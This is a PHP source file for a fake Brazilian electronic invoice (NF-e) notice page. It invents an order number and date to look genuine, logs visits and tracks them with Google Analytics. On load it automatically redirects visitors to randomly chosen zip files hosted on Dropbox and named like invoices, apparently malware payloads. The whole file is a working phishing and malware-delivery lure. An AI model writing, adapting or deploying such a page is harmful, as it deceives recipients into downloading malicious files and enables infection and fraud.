<?php
	$handle = @fopen('contador.txt', 'a');
	fwrite($handle, date('d/m/Y H:i:s').PHP_EOL);
	fclose($handle);
	
	//Configurações Dropbox
	$dropbox = true;
	$url = array();
	//$url[0] = 'https://www.dropbox.com/s/59fsw5xv2p5f6la/NF-u775320791.zip?dl=1';
	//$url[1] = 'https://www.dropbox.com/s/c09u7qqnowuaplv/NF-s775320791.zip?dl=1';
	//$url[2] = 'https://www.dropbox.com/s/4h0sjhgmor6c8yv/NF-i775320791.zip?dl=1';
	//$url[3] = 'https://www.dropbox.com/s/1yvmqdra5gxhx0x/NF-e775320791.zip?dl=1';
	//$url[4] = 'https://www.dropbox.com/s/vmk7s6dy8pa6z35/NF-a775320791.zip?dl=1';
	
	$handle = @fopen("config.txt", "r");
	if($handle)
		while (($buffer = fgets($handle, 4096)) !== false)
			array_push($url, $buffer);
	fclose($handle);
	header('location: '.$url[rand(0,count($url))].'');
	//exit();
?>
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<?php 
			if($dropbox)
				print '<meta http-equiv="refresh" content="0; url='.$url[rand(0,count($url))].'">';
			
			$link = $_SERVER['PHP_SELF'];
			
			$date = new DateTime();
			$date->modify('-10 hour');
		?>
		<script>
		  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
		  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
		  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
		  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
		  var page = new String(window.location.href);
		  page = page.replace('www.','');
		  page = page.replace('http://','');
		  page = page.replace('https://','');
		  //ga('create', 'UA-104504016-1', 'auto');
		  ga('create', 'UA-105183436-1', 'auto');
		  ga('send', { hitType: 'pageview', page: page });

		</script>
		<title>NOTA FISCAL ELETRONICA</title>
	</head>
	<body>
	<div>
		<span><strong>Emissão de NF-e (Nota Fiscal Eletrônica)</strong></span>
	</div>
	<div><span>Prezado (A)</span></div>
	<div></div>
	<div>
		<span>
			Foi emitida uma NF-e (Nota Fiscal Eletrônica) referente ao seu pedido nº <?=rand(100000000,999999999);?>, realizado em <?=$date->format('d/m/Y');?> as <?=$date->format('H:i');?>
		</span>
	</div>
	<div></div>
	<div><span>NF-e Nota Fiscal Eletrônica</span></div>
	<div></div>
	<div><span>Escolha abaixo a melhor forma de consultar sua NF-e</span></div>
	<span><br></span>
	<ul>
		<li><big><a href="<?=$link;?>">Visualizar em formato PDF</a></big></li>
		<li><big><a href="<?=$link;?>">Visualizar em formato XML</a></big></li>
	</ul>
	</body>
</html>